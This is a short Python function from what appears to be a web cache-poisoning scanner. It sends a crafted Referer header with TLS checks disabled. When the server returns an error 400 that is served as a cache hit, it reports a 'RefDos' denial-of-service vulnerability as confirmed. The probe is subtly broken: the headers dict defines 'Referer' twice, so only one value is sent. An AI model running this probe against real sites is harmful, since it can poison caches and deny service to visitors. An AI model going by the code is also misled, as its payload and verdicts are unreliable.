#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import traceback


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)



def RefDos(url, s, main_status_code, authent):
    headers = {
    "Referer": "xy",
    "Referer": "x"
    }
    req_ref = s.get(url, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
    if req_ref.status_code == 400 and req_ref.status_code != main_status_code:
        print("   └── \033[31m{} with header {} response 400\033[0m".format(url, headers))
        for rf in req_ref.headers:
            if "cache" in rf.lower():
                if "hit" in req_ref.headers[rf].lower():
                    print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | RefDos | \033[34m{}\033[0m | PAYLOAD: {}".format(url, headers))